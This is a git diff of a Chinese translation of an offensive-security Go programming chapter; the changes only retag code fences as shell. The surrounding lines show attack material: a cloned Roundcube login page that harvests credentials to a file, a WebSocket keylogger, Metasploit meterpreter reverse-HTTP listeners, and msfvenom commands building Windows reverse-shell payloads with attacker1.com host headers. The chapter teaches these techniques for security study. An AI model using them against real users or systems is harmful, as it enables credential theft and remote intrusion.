@@ -48,7 +48,7 @@ func main() {
 
 可以使用`curl`来测试服务：
 
-```text
+```sh
 $ curl -i http://localhost:8000/hello?name=alice 
 HTTP/1.1 200 OK
 Date: Sun, 12 Jan 2020 01:18:26 GMT 
@@ -100,7 +100,7 @@ func main() {
 
 在终端里执行下：
 
-```text
+```sh
 $ curl http://localhost:8000/a
 Executing /a
 $ curl http://localhost:8000/d
@@ -152,7 +152,7 @@ func main() {
 
 运行代码，然后发送请求就好输出两个本次请求开始和结束时间的信息：
 
-```text
+```sh
 $ go build -o simple_middleware
 $ ./simple_middleware
 2020/01/16 06:23:14 start
@@ -171,7 +171,7 @@ $ ./simple_middleware
 
 使用`gorilla/mux`之前先安装：
 
-```text
+```sh
 $ go get github.com/gorilla/mux
 ```
 
@@ -208,7 +208,7 @@ r.HandleFunc("/users/{user}", func(w http.ResponseWriter, req *http.Request) {
 
 在路径定义中，使用大括号定义请求参数。可以将其看作一个已命名的占位符。然后，在处理函数内，调用`mux.Vars()`来解析请求体，返回`map[string] string`类型的数据，其值为请求的参数名字和各自的值。使用`user`作关键字。因此，`/users/bob`的请求就会产生对Bob的问候。
 
-```text
+```sh
 $ curl http://localhost:8000/users/bob
 hi bob
 ```
@@ -224,7 +224,7 @@ r.HandleFunc("/users/{user:[a-z]+}", func(w http.ResponseWriter, req *http.Reque
 
 任何不匹配的模式现在都会返回404响应：
 
-```text
+```sh
 $ curl -i http://localhost:8000/users/bob1 HTTP/1.1
 404 Not Found
 ```
@@ -239,7 +239,7 @@ $ curl -i http://localhost:8000/users/bob1 HTTP/1.1
 
 `negroni`，链接为`https://github.com/urfave /negroni/`，非常优秀，因为不是很大的框架。在其他框架中也很容易使用，也非常灵活。还附带了对程序都很有用的默认中间件。在使用之前先获取：
 
-```text
+```sh
 $ go get github.com/urfave/negroni
 ```
 
@@ -281,7 +281,7 @@ n.Use(negroni.NewRecovery())
 
 继续编译之前创建的代码4-4，然后运行。然后向服务监听的地址`http://localhost:8000`发送web请求。`negroni`日志中间件就好输出下面的信息。输出带有时间戳，响应码，处理时间，host，和HTTP方法。
 
-```text
+```sh
 $ go build -s negroni_example
 $ ./negroni_example
 [negroni] 2020-01-19T11:49:33-07:00 | 404 | 1.0002ms | localhost:8000 | GET
@@ -371,7 +371,7 @@ func main() {
 
 编译并执行代码4-5，然后发送带有正确和错误凭证的请求。会看到下面的输出：
 
-```text
+```sh
 $ curl -i http://localhost:8000/hello
 HTTP/1.1 401 Unauthorized
 Content-Type: text/plain; charset=utf-8
@@ -437,7 +437,7 @@ func main() {
 
 运行代码查看生成的 HTML，应该会注意到作为上下文的一部分所的脚本标记和单引号字符被正确编码了。Neat-o!
 
-```text
+```sh
 $ go build -o template_example $ ./template_example
 <html>
   <body>
@@ -460,13 +460,13 @@ $ go build -o template_example $ ./template_example
 
 执行下面的命令就能启动自己的Roundcube服务。如果不想运行Roundcube服务也不要担心，实战源代码也有一个站点的克隆。不过，为了完整起见，我们还是加上了这个:
 
-```text
+```sh
 $ docker run --rm -it -p 127.0.0.180:80 robbertkl/roundcube
 ```
 
 该命令启动了一个Roundcube的Docker实例。如果浏览[http://127.0.0.1:80的话，会看到一个登录表单。通常情况下，用\`wget\`克隆一个站点和所有该站点所需要的文件，但是Roundcube使用的是JavaScript，可以防止这种情况发生。但是，可以使用Google](http://127.0.0.1:80的话，会看到一个登录表单。通常情况下，用`wget`克隆一个站点和所有该站点所需要的文件，但是Roundcube使用的是JavaScript，可以防止这种情况发生。但是，可以使用Google) Chrome来保存。在实战目录下，会看到一个文件夹的结构如代码4-7所示：
 
-```text
+```sh
 $ tree
 .
 +-- main.go
@@ -559,7 +559,7 @@ func main() {
 
 最后，像之前那样启动服务。构建并执行代码4-8中的代码之后，打开浏览器并浏览`http://localhost:8080`。尝试在表单中提交`username 和 password`。然后回到终端退出程序，查看`credentials.txt`显示如下：
 
-```text
+```sh
 $ go build -o credential_harvester
 $ ./credential_harvester
 ^C
@@ -694,7 +694,7 @@ func main() {
 
 让我们启动服务。如果打开HTML文件，应该会有 `connection established` 的信息。这是日志，因为JavaScript文件被浏览器渲染且请求WebSocket连接。如果在表单元素中键入凭证，在服务中会看到下面的输出。
 
-```text
+```sh
 $ go run main.go -listen-addr=127.0.0.1:8080 -ws-addr=127.0.0.1:8080 Connection from 127.0.0.1:58438
 From 127.0.0.1:58438: u
 From 127.0.0.1:58438: s
@@ -727,7 +727,7 @@ From 127.0.0.1:58438: d
 
 这是计划。设置两个单独的Meterpreter反向HTTP侦听器。在本例中个，它们安装在IP地址为10.0.1.20的虚拟机中，但是它们很可能存在于不同的主机上。将监听器分别绑定到10080 到 20080端口。在真实的情况下，这些监听器可以运行在任何地方，只要代理能访问到这些端口。确保已经安装了Metasploit\(在Kali Linux上是预先安装了的\)；然后启动监听器：
 
-```text
+```sh
 $ msfconsole
 > use exploit/multi/handler
 > set payload windows/meterpreter_reverse_http
@@ -743,7 +743,7 @@ $ msfconsole
 
 在第二个Metasploit实例中，执行类似的操作，在端口20080上启动一个额外的监听器。真正唯一不一样的地方是绑定了不同的端口：
 
-```text
+```sh
 $ msfconsole
 > use exploit/multi/handler
 > set payload windows/meterpreter_reverse_http > set LHOST 10.0.1.20
@@ -815,7 +815,7 @@ func main() {
 
 至此，已经有了两个正在运行的Meterpreter反向HTTP监听器，现在也应该有一个运行中的反向代理。最后一步是生成测试来检验代理是否工作。使用和Metasploit一起发布的负载生成工具 `msfvenom` ，来生成一对Windows可执行文件:
 
-```text
+```sh
 $ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80 HttpHostHeader=attacker1.com -f exe -o payload1.exe
 $ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80 HttpHostHeader=attacker2.com -f exe -o payload2.exe
 ```
